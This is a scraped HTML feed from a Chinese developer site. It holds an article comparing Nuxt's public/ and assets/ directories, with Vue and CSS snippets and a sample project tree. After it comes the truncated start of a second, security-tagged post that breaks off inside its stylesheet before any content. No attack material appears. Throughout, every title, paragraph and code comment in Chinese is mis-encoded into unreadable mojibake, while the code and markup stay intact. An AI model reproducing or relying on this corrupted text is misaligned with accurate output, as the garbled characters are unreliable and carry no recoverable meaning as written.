content="åˆ°åº•æ˜¯ç”¨nuxtçš„publicè¿˜æ˜¯assetsï¼Ÿä¸€ç¯‡æ–‡ç« å¼€æ‚Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-09T03:03:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ±Ÿæ¹–æ–‡äºº"/> <meta itemprop="url" content="https://juejin.cn/user/3044986347066480"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ°åº•æ˜¯ç”¨nuxtçš„publicè¿˜æ˜¯assetsï¼Ÿä¸€ç¯‡æ–‡ç« å¼€æ‚Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3044986347066480/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ±Ÿæ¹–æ–‡äºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:03:22.000Z" title="Fri Jan 09 2026 03:03:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    22
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">assets</h2>
<blockquote>
<p><code>Nuxt</code>ä¸ºä½ çš„èµ„äº§æä¾›äº†ä¸¤ç§å¤„ç†æ–¹å¼ã€‚</p>
</blockquote>
<p><code>Nuxt</code>ä½¿ç”¨ä¸¤ä¸ªç›®å½•æ¥å¤„ç†æ ·å¼è¡¨ã€å­—ä½“æˆ–å›¾ç‰‡ç­‰èµ„äº§ï¼š</p>
<ul>
<li><code>public/</code>ç›®å½•çš„å†…å®¹ä¼šç›´æ¥ä»¥æœåŠ¡å™¨æ ¹è·¯å¾„çš„å½¢å¼æä¾›ã€‚</li>
<li><code>assets/</code>ç›®å½•æŒ‰æƒ¯ä¾‹åŒ…å«ä½ å¸Œæœ›æ„å»ºå·¥å…·ï¼ˆ<code>Vite</code>æˆ–<code>webpack</code>ï¼‰å¤„ç†çš„æ‰€æœ‰èµ„äº§ã€‚</li>
</ul>
<h2 data-id="heading-1">å…¬å…±ç›®å½•</h2>
<p><code>public/</code>ç›®å½•ç”¨ä½œé™æ€èµ„äº§çš„å…¬å…±æœåŠ¡å™¨ï¼Œè¿™äº›èµ„äº§å¯ä»¥åœ¨ä½ çš„åº”ç”¨å®šä¹‰çš„<code>URL</code>ä¸‹å…¬å¼€è®¿é—®ã€‚</p>
<p>ä½ å¯ä»¥é€šè¿‡åº”ç”¨çš„ä»£ç æˆ–æµè§ˆå™¨ä½¿ç”¨æ ¹<code>URL</code>/æ¥è·å–<code>public/</code>ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚</p>
<h3 data-id="heading-2">ç¤ºä¾‹</h3>
<p>ä¾‹å¦‚ï¼Œå¼•ç”¨ä½äº<code>public/img/</code>ç›®å½•ä¸­çš„å›¾åƒæ–‡ä»¶ï¼Œå¯é€šè¿‡é™æ€<code>URL</code>/img/nuxt.pngè®¿é—®ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">// app.vue
&lt;template&gt;
  &lt;img src="/img/nuxt.png" alt="æ¢ç´¢ Nuxt" /&gt;
&lt;/template&gt;
</code></pre>
<h2 data-id="heading-3">èµ„äº§ç›®å½•</h2>
<p>Nuxtä½¿ç”¨<code>Vite</code>ï¼ˆé»˜è®¤ï¼‰æˆ–<code>webpack</code>æ¥æ„å»ºå’Œæ‰“åŒ…ä½ çš„åº”ç”¨ã€‚è¿™äº›æ„å»ºå·¥å…·çš„ä¸»è¦åŠŸèƒ½æ˜¯å¤„ç†<code>JavaScript</code>æ–‡ä»¶ï¼Œä½†å¯ä»¥é€šè¿‡<code>æ’ä»¶</code>ï¼ˆç”¨äºViteï¼‰æˆ–<code>åŠ è½½å™¨</code>ï¼ˆç”¨äºwebpackï¼‰æ‰©å±•ï¼Œä»¥å¤„ç†å…¶ä»–ç±»å‹çš„èµ„äº§ï¼Œä¾‹å¦‚æ ·å¼è¡¨ã€å­—ä½“æˆ–<code>SVG</code>ã€‚è¿™ä¸€è¿‡ç¨‹ä¸»è¦ä¸ºäº†æ€§èƒ½æˆ–ç¼“å­˜ç›®çš„è½¬æ¢åŸå§‹æ–‡ä»¶ï¼ˆä¾‹å¦‚æ ·å¼è¡¨å‹ç¼©æˆ–æµè§ˆå™¨ç¼“å­˜å¤±è´¥ï¼‰ã€‚</p>
<p>æŒ‰ç…§æƒ¯ä¾‹ï¼Œ<code>Nuxt</code>ä½¿ç”¨<code>assets/</code>ç›®å½•æ¥å­˜å‚¨è¿™äº›æ–‡ä»¶ï¼Œä½†è¯¥ç›®å½•æ²¡æœ‰è‡ªåŠ¨æ‰«æåŠŸèƒ½ï¼Œä½ å¯ä»¥ä¸ºå®ƒä½¿ç”¨ä»»ä½•å…¶ä»–åç§°ã€‚</p>
<p>åœ¨åº”ç”¨ä»£ç ä¸­ï¼Œå¯ä»¥é€šè¿‡<code>~/assets/</code>è·¯å¾„å¼•ç”¨ä½äº<code>assets/</code>ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚</p>
<h3 data-id="heading-4">ç¤ºä¾‹</h3>
<p>ä¾‹å¦‚ï¼Œå¼•ç”¨ä¸€ä¸ªå›¾åƒæ–‡ä»¶ï¼Œå¦‚æœæ„å»ºå·¥å…·é…ç½®ä¸ºå¤„ç†æ­¤æ–‡ä»¶æ‰©å±•åï¼Œè¯¥æ–‡ä»¶å°†è¢«å¤„ç†ï¼š</p>
<pre><code class="hljs language-html" lang="html">// app.vue
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"~/assets/img/nuxt.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"æ¢ç´¢ Nuxt"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<blockquote>
<p><code>Nuxt</code>ä¸ä¼šä»¥é™æ€<code>URL</code>ï¼ˆå¦‚<code>/assets/my-file.png</code>ï¼‰æä¾›<code>assets/</code>ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚å¦‚æœä½ éœ€è¦é™æ€<code>URL</code>ï¼Œè¯·ä½¿ç”¨<code>public/</code>ç›®å½•ã€‚</p>
</blockquote>
<h2 data-id="heading-5">åŒºåˆ« â€”â€” çº ç»“ç”¨å“ªä¸ªå¯ä»¥çœ‹è¿™å¼ è¡¨</h2>



































<table><thead><tr><th>ç‰¹æ€§</th><th><code>public/</code>ç›®å½•</th><th><code>assets/</code>ç›®å½•</th></tr></thead><tbody><tr><td>ç›®çš„</td><td><code>é™æ€</code>èµ„æºæœåŠ¡å™¨</td><td><code>æ„å»ºæ—¶</code>å¤„ç†çš„èµ„æº</td></tr><tr><td><code>URL</code>è®¿é—®</td><td>ç›´æ¥é€šè¿‡æ ¹è·¯å¾„<code>/</code>è®¿é—®</td><td>éœ€é€šè¿‡<code>~/assets/</code>è·¯å¾„å¼•ç”¨</td></tr><tr><td>æ„å»ºå¤„ç†</td><td>ä¸ç»è¿‡æ„å»ºå·¥å…·å¤„ç†</td><td>ç»è¿‡<code>Vite/webpack</code>å¤„ç†ï¼ˆå‹ç¼©ã€ä¼˜åŒ–ç­‰ï¼‰</td></tr><tr><td>æ›´æ–°æ–¹å¼</td><td>ç›´æ¥æ›¿æ¢æ–‡ä»¶</td><td>æ„å»ºåç”Ÿæˆæ–°æ–‡ä»¶ï¼ˆå¸¦å“ˆå¸Œï¼‰</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>ä¸å¸¸æ›´æ”¹çš„èµ„æºï¼ˆå¦‚<code>faviconã€robots.txt</code>ï¼‰</td><td>éœ€è¦æ„å»ºä¼˜åŒ–çš„èµ„æºï¼ˆå›¾ç‰‡ã€æ ·å¼ã€å­—ä½“ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-6">public/</h3>
<pre><code class="hljs language-html" lang="html">// vue
<span class="hljs-comment">&lt;!-- é€‚ç”¨äºï¼š --&gt;</span>
<span class="hljs-comment">&lt;!-- ä¸å¸¸æ›´æ–°çš„é™æ€æ–‡ä»¶ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/favicon.ico"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"ç½‘ç«™å›¾æ ‡"</span> /&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/brochure.pdf"</span>&gt;</span>ä¸‹è½½æ‰‹å†Œ<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
</code></pre>
<h3 data-id="heading-7">assets/</h3>
<pre><code class="hljs language-html" lang="html">// vue
<span class="hljs-comment">&lt;!-- é€‚ç”¨äºï¼š --&gt;</span>
<span class="hljs-comment">&lt;!-- éœ€è¦ä¼˜åŒ–å¤„ç†çš„å›¾ç‰‡ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"~/assets/images/hero.jpg"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"è‹±é›„"</span> /&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 2. æ ·å¼æ–‡ä»¶ï¼ˆSCSS/SASS/LESSï¼‰ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-keyword">@import</span> <span class="hljs-string">'~/assets/styles/main.scss'</span>;
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 3. å­—ä½“æ–‡ä»¶ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-keyword">@font-face</span> {
  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'CustomFont'</span>;
  <span class="hljs-attribute">src</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">'~/assets/fonts/custom.woff2'</span>) <span class="hljs-built_in">format</span>(<span class="hljs-string">'woff2'</span>);
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h2 data-id="heading-8">å®æˆ˜ç›®å½•ç»“æ„</h2>
<pre><code class="hljs language-html" lang="html">my-nuxt-app/
â”œâ”€â”€ public/
â”‚   â”œâ”€â”€ favicon.ico          # ç›´æ¥é€šè¿‡ /favicon.ico è®¿é—®
â”‚   â”œâ”€â”€ robots.txt          # ç›´æ¥é€šè¿‡ /robots.txt è®¿é—®
â”‚   â””â”€â”€ downloads/
â”‚       â””â”€â”€ brochure.pdf    # ç›´æ¥é€šè¿‡ /downloads/brochure.pdf è®¿é—®
â”œâ”€â”€ assets/
â”‚   â”œâ”€â”€ images/
â”‚   â”‚   â”œâ”€â”€ logo.png        # æ„å»ºä¼˜åŒ–åçš„å›¾ç‰‡
â”‚   â”‚   â””â”€â”€ background.jpg
â”‚   â”œâ”€â”€ styles/
â”‚   â”‚   â”œâ”€â”€ main.scss       # ç¼–è¯‘å¤„ç†çš„SCSSæ–‡ä»¶
â”‚   â”‚   â””â”€â”€ variables.scss
â”‚   â””â”€â”€ fonts/
â”‚       â””â”€â”€ custom.woff2    # å­—ä½“æ–‡ä»¶
â””â”€â”€ components/
    â””â”€â”€ MyComponent.vue
</code></pre>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- ä¼˜å…ˆä½¿ç”¨assets/ä»¥è·å¾—æ„å»ºä¼˜åŒ–  --&gt;
&lt;img src="~/assets/images/product.jpg" alt="äº§å“" /&gt;

&lt;!-- å¤§å°ºå¯¸æˆ–ä¸éœ€è¦ä¼˜åŒ–çš„å›¾ç‰‡å¯ä»¥æ”¾åœ¨public --&gt;
&lt;img src="/documentation/large.png" alt="æ¶æ„å›¾" &gt;
</code></pre>
<h3 data-id="heading-9">åŠ¨æ€</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
// ä½¿ç”¨ import è·å– assets èµ„æºï¼ˆä¼šç»è¿‡æ„å»ºå¤„ç†ï¼‰
import logo from '~/assets/images/logo.png'

// ä½¿ç”¨ç›¸å¯¹è·¯å¾„å¼•ç”¨ public èµ„æº
const publicImage = '/images/banner.png'
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-10">cssä¸­ç”¨</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* åœ¨ CSS ä¸­å¼•ç”¨ assets èµ„æº */</span>
<span class="hljs-selector-class">.hero</span> {
  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">'~/assets/images/bg.jpg'</span>);
}

<span class="hljs-comment">/* å¼•ç”¨ public èµ„æº */</span>
<span class="hljs-selector-class">.external</span> {
  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">'/external-bg.png'</span>);
}
</code></pre>
<h2 data-id="heading-11">æé†’</h2>
<ol>
<li>
<p><strong>ç¼“å­˜ç­–ç•¥</strong>ï¼š</p>
<ul>
<li><code>assets/</code>Â ä¸­çš„æ–‡ä»¶é€šå¸¸ä¼šæ·»åŠ å“ˆå¸Œå€¼ï¼Œä¾¿äºç¼“å­˜ç®¡ç†</li>
<li><code>public/</code>Â ä¸­çš„æ–‡ä»¶ä½¿ç”¨åŸå§‹åç§°ï¼Œéœ€æ‰‹åŠ¨ç®¡ç†ç¼“å­˜</li>
</ul>
</li>
<li>
<p><strong>éƒ¨ç½²è€ƒè™‘</strong>ï¼š</p>
<ul>
<li><code>public/</code>Â ç›®å½•å†…å®¹ä¼šåŸæ ·å¤åˆ¶åˆ°æ„å»ºè¾“å‡º</li>
<li><code>assets/</code>Â ç›®å½•å†…å®¹ä¼šè¢«å¤„ç†å¹¶æ‰“åŒ…</li>
</ul>
</li>
<li>
<p><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼š</p>
<ul>
<li>å°å›¾æ ‡å»ºè®®ä½¿ç”¨Â <code>assets/</code>Â ä»¥ä¾¿æ‰“åŒ…ä¼˜åŒ–</li>
<li>å¤§æ–‡ä»¶ï¼ˆå¦‚è§†é¢‘ï¼‰å»ºè®®ä½¿ç”¨Â <code>public/</code>Â é¿å…æ„å»ºè¿‡ç¨‹å˜æ…¢</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åºç« ï¼šå½“æŠ“åŒ…å·¥å…·é‡ä¸Š"é“œå¢™é“å£"]]></title>    <link>https://juejin.cn/post/7592887786966204452</link>    <guid>https://juejin.cn/post/7592887786966204452</guid>    <pubDate>2026-01-09T03:05:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592887786966204452" data-draft-id="7592846242176450594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åºç« ï¼šå½“æŠ“åŒ…å·¥å…·é‡ä¸Š&quot;é“œå¢™é“å£&quot;"/> <meta itemprop="keywords" content="å®‰å…¨"/> <meta itemprop="datePublished" content="2026-01-09T03:05:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¾¹é™…æ•ˆåº”"/> <meta itemprop="url" content="https://juejin.cn/user/626060316652204"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åºç« ï¼šå½“æŠ“åŒ…å·¥å…·é‡ä¸Š"é“œå¢™é“å£"
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/626060316652204/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¾¹é™…æ•ˆåº”
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:05:50.000Z" title="Fri Jan 09 2026 03:05:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul 